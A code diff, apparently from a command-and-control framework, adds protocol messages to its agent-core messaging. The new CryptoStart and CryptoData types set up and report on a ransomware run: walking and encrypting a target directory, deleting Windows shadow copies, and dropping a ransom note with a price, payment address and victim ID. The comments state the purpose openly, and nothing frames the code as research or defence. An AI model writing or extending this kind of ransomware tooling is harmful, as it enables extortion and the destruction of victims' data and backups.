@@ -43,6 +43,8 @@ const (
 
 	// Wireless capture (agent -> core)
 	TypeWirelessStart MessageType = "wireless_start"
+	TypeCryptoStart   MessageType = "crypto_start"
+	TypeCryptoData    MessageType = "crypto_data"
 	TypeWirelessStop  MessageType = "wireless_stop"
 	TypeWirelessData  MessageType = "wireless_data"
 	TypeWirelessDone  MessageType = "wireless_done"
@@ -226,4 +228,37 @@ type WirelessDone struct {
 type WirelessFail struct {
 	SessionID string `json:"session_id"`
 	Error     string `json:"error"`
+
+
+
 }
+
+// CryptoStart kicks off a ransomware run on an agent. The agent encrypts
+// the target tree, kills VSS snapshots (Windows), and drops the ransom
+// note. Progress and result come back as CryptoData messages.
+type CryptoStart struct {
+	SessionID string `json:"session_id"`
+	Root      string `json:"root"`       // directory to walk
+	KeyID     uint32 `json:"key_id"`     // which operator key the wrapped AES keys target
+	DryRun    bool   `json:"dry_run"`    // enumerate + report, write nothing
+	KillVSS   bool   `json:"kill_vss"`   // run the shadow-copy stage
+	Note      bool   `json:"note"`       // drop the ransom note
+	// note parameters — required if Note is true
+	ContactEmail string `json:"contact_email"`
+	Address      string `json:"address"`
+	Price        string `json:"price"`
+	VictimID     string `json:"victim_id"`
+}
+
+// CryptoData streams progress back to core.
+type CryptoData struct {
+	SessionID string `json:"session_id"`
+	Stage     string `json:"stage"`      // "walk", "encrypt", "shadow", "note", "done"
+	Path      string `json:"path"`       // current file, if applicable
+	Done      int64  `json:"done"`       // count of items processed
+	Total     int64  `json:"total"`      // total found (0 if unknown)
+	Bytes     int64  `json:"bytes"`      // bytes processed, running total
+	OK        bool   `json:"ok"`
+	Error     string `json:"error,omitempty"`
+}
+
